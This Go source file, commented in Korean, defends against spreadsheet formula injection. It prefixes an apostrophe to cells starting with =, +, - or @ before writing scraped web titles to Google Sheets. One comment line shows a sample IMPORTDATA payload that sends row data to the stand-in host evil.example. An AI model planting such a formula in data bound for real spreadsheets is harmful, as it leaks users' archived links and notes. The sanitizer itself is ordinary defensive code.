package sheets

// 수식 주입 방어.
//
// **왜 필요한가.** 시트에 들어가는 제목·설명은 임의의 웹페이지에서 긁어 온 값이다
// (og:title, og:description, 확장이 캡처한 본문, iOS 공유 캡션). 구글 시트는 `=`로
// 시작하는 셀을 **수식으로 실행**하므로, 제목을 통제할 수 있는 사람이 링크 하나만
// 저장시키면 동기화 후 시트에서 이런 것이 살아 있는 수식이 된다:
//
//	=IMPORTDATA("https://evil.example/?d=" & ENCODEURL(TEXTJOIN(",",TRUE,A2:I2)))
//
// 구글은 이걸 사용자 확인 없이 실행하고, 그 한 줄로 URL·제목·메모가 전부 외부로 나간다.
// 아카이브 전체를 유출하는 경로다.
//
// `textutil.CleanMeta`는 제어문자 제거와 엔티티 해제만 하고 선행 `=`를 남긴다 —
// 거기서 막을 문제가 아니다. 저장된 값은 원문 그대로여야 하고(화면·검색·태거가 쓴다),
// **시트에 넣는 순간에만** 무해화하는 것이 맞다.
//
// 앞에 아포스트로피를 붙이면 시트가 "이건 텍스트다"로 읽고, 그 아포스트로피는
// 셀에 표시되지 않는다.
const dangerousPrefixes = "=+-@"

// EscapeRows는 시트에 쓸 값들을 무해화한다. 문자열이 아닌 값은 그대로 둔다.
func EscapeRows(rows [][]any) [][]any {
	out := make([][]any, len(rows))
	for i, row := range rows {
		cells := make([]any, len(row))
		for j, v := range row {
			cells[j] = escapeCell(v)
		}
		out[i] = cells
	}
	return out
}

func escapeCell(v any) any {
	s, ok := v.(string)
	if !ok || s == "" {
		return v
	}
	for i := 0; i < len(dangerousPrefixes); i++ {
		if s[0] == dangerousPrefixes[i] {
			return "'" + s
		}
	}
	return s
}
